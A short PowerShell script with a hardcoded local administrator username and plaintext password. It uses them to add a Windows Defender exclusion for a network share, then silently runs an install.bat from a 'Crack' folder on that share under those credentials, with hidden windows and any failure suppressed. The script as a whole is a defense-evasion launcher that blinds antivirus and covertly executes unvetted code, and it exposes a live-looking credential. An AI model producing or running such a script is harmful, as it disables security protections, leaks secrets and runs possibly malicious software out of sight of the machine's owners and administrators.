$username = '.\gadmin'
$password = 'Roy@lG@rden57'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
try{
Start-Process powershell.exe -ArgumentList ("Add-MpPreference -ExclusionPath \\orit01\ITShare\Remote") -Credential $Credential -WindowStyle Hidden
}
catch {
exit
}
Start-Process -FilePath \\orit01\ITShare\Remote\Crack\install.bat -Credential $credential -WindowStyle Hidden
